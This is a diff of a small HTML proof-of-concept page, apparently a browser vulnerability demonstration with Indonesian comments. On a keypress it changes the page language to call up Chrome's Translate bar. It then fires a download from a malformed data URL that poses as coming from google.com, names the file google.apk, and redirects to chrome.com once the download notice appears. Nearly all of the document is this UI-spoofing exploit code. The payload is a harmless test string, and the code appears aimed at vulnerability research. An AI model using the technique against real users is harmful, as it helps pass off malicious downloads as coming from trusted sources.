@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>Chrome Download PoC</title>
+  <title>POC Redirect + Translate</title>
   <style>
     body {
       height: 100vh;
@@ -18,23 +18,36 @@
 
 <body>
 
-<p>Press any key to continue</p>
+<h2>POC </h2>
+
 
 <script>
 window.addEventListener('keydown', function () {
 
-  // Trigger download (malformed data URL)
-  const a = document.createElement("a");
-  a.href = "data://chrome.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
-  a.download = "chrome.apk";
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
+  // 1. Ganti halaman ke bahasa asing → trigger Translate bar
+  document.body.innerHTML = `
+    <h1>....</h1>
+    <p>....</p>
+  `;
 
-  // Redirect after download toast
+  // 2. Delay agar Translate UI sempat muncul
   setTimeout(() => {
-    window.location.href = "https://chrome.com";
-  }, 350);
+
+    // 3. Trigger download (malformed data URL)
+    const a = document.createElement("a");
+    a.href = "data://google.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
+    a.download = "google.apk";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+
+    // 4. Redirect SETELAH download toast muncul
+    setTimeout(() => {
+      window.location.href = "https://chrome.com";
+      // tujuan boleh apa saja, tidak mempengaruhi PoC
+    }, 350);
+
+  }, 300);
 
 }, { once: true });
 </script>
